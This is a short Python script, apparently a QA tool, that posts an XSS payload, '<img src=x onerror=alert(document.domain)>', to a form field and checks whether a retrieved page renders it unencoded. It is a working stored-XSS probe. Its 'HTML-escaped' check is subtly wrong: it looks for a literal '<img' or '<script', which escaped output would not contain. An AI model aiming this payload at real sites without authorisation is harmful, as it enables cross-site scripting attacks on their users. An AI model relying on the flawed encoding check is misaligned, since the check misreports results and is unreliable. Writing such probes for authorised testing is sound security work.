#!/usr/bin/env python3
# stored_xss_probe.py
# Requires: Python 3.12, requests 2.32
"""Post a payload to a content endpoint and verify it renders unencoded on retrieval."""
import argparse
import requests

PAYLOAD = "<img src=x onerror=alert(document.domain)>"


def post_and_retrieve(post_url: str, retrieve_url: str, field: str = "bio") -> str:
    """Post the payload and check if it renders unencoded on retrieval."""
    session = requests.Session()
    session.post(post_url, data={field: PAYLOAD}, timeout=10)
    response = session.get(retrieve_url, timeout=10)
    if PAYLOAD in response.text:
        return "STORED_XSS_UNENCODED: payload persisted and renders verbatim"
    if "<img" in response.text or "<script" in response.text:
        return "STORED_XSS_ENCODED: payload persisted but is HTML-escaped"
    return "NOT_STORED: payload not found in retrieved page"


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Stored XSS probe")
    parser.add_argument("--post-url", required=True, help="URL to POST the payload (e.g. https://staging.qa.local/profile)")
    parser.add_argument("--retrieve-url", required=True, help="URL to retrieve the rendered content (e.g. https://staging.qa.local/user/me)")
    parser.add_argument("--field", default="bio", help="Form field name (default: bio)")
    args = parser.parse_args()
    result = post_and_retrieve(args.post_url, args.retrieve_url, args.field)
    print(f"[{args.retrieve_url}] {result}")
